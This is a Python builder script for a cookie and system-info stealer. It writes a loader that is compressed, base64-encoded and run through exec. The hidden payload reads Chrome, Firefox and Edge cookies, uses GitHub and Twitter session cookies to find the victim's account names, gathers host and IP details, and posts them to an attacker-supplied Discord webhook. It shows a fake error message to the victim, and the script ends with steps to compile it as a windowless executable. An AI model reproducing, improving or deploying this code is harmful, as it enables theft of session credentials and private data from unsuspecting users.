import base64
import zlib
import textwrap

def generate_payload(webhook_url):
    code = textwrap.dedent(f'''
        import os
        import requests
        import platform
        import socket
        import browser_cookie3
        import time
        import re
        from datetime import datetime

        def get_system_info():
            try:
                computer_name = platform.node()
                username = os.getlogin()
                system = platform.system()
                release = platform.release()
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                try:
                    ip_response = requests.get('https://api.ipify.org', timeout=5)
                    public_ip = ip_response.text.strip()
                except:
                    public_ip = "Unknown"
                return {{
                    "Computer Name": computer_name,
                    "Username": username,
                    "OS": f"{{system}} {{release}}",
                    "Local IP": local_ip,
                    "Public IP": public_ip,
                    "Timestamp": str(datetime.now())
                }}
            except:
                return {{}}

        def get_github_username(cookies):
            try:
                session_cookies = {{c.name: c.value for c in cookies if 'github.com' in c.domain}}
                if 'user_session' not in session_cookies:
                    return None
                headers = {{'User-Agent': 'Mozilla/5.0'}}
                r = requests.get('https://github.com/settings/profile', cookies=session_cookies, headers=headers, timeout=5)
                if r.status_code == 200:
                    match = re.search(r'profile-name.+?value="([^"]+)"', r.text)
                    if match:
                        return match.group(1)
            except:
                pass
            return None

        def get_twitter_username(cookies):
            try:
                session_cookies = {{c.name: c.value for c in cookies if 'twitter.com' in c.domain}}
                if 'auth_token' not in session_cookies:
                    return None
                headers = {{'User-Agent': 'Mozilla/5.0'}}
                r = requests.get('https://twitter.com/settings/account', cookies=session_cookies, headers=headers, timeout=5)
                if r.status_code == 200:
                    match = re.search(r'data-screen-name="([^"]+)"', r.text)
                    if match:
                        return match.group(1)
            except:
                pass
            return None

        def detect_social_sessions_with_usernames():
            sessions = {{}}
            browsers = [
                ('Chrome', browser_cookie3.chrome),
                ('Firefox', browser_cookie3.firefox),
                ('Edge', browser_cookie3.edge)
            ]
            social_platforms = {{
                'GitHub': get_github_username,
                'Twitter': get_twitter_username
            }}
            for browser_name, browser_func in browsers:
                try:
                    cookies = browser_func()
                    if not cookies:
                        continue
                    for platform_name, username_func in social_platforms.items():
                        username = username_func(cookies)
                        if username:
                            sessions[f"{{browser_name}} - {{platform_name}}"] = f"Logged in as {{username}}"
                        else:
                            # If cookies for domain present but username not found, mark active session
                            if any(domain in c.domain for c in cookies for domain in [platform_name.lower() + ".com"]):
                                sessions[f"{{browser_name}} - {{platform_name}}"] = "Active session (username not found)"
                except Exception as e:
                    continue
            return sessions

        def send_report(sys_info, social_info, webhook):
            content = "**System Report**\\n"
            content += f"System: {{sys_info.get('Computer Name', 'N/A')}}\\n"
            content += f"User: {{sys_info.get('Username', 'N/A')}}\\n"
            content += f"Local IP: {{sys_info.get('Local IP', 'N/A')}}\\n"
            content += f"Public IP: {{sys_info.get('Public IP', 'N/A')}}\\n"
            content += f"Time: {{sys_info.get('Timestamp', 'N/A')}}\\n\\n"
            content += "**Browser Sessions**\\n"
            if not social_info:
                content += "No active social sessions found.\\n"
            else:
                for service, status in social_info.items():
                    content += f"• {{service}}: {{status}}\\n"
            try:
                requests.post(webhook, json={{"content": content}}, timeout=10)
            except:
                pass

        def main():
            print("Loading...")
            webhook = "{webhook_url}"
            sys_info = get_system_info()
            social_info = detect_social_sessions_with_usernames()
            send_report(sys_info, social_info, webhook)
            time.sleep(3)
            print("Error, exiting...")
            time.sleep(2)

        if __name__ == "__main__":
            main()
    ''')

    compressed = zlib.compress(code.encode())
    encoded = base64.b64encode(compressed).decode()

    loader_code = f'''
import base64
import zlib

payload_encoded = "{encoded}"

payload = zlib.decompress(base64.b64decode(payload_encoded)).decode()

exec(payload)
'''

    return loader_code

if __name__ == "__main__":
    print("Loaded succesfully!")
    webhook = input("Enter your Discord webhook URL: ").strip()
    filename = input("Enter output filename (e.g., grabber.py): ").strip()

    code = generate_payload(webhook)

    with open(filename, "w", encoding="utf-8") as f:
        f.write(code)

    print(f"Generated encrypted grabber saved as {filename}")
    print(f"Compile with: pyinstaller --onefile --noconsole {filename}")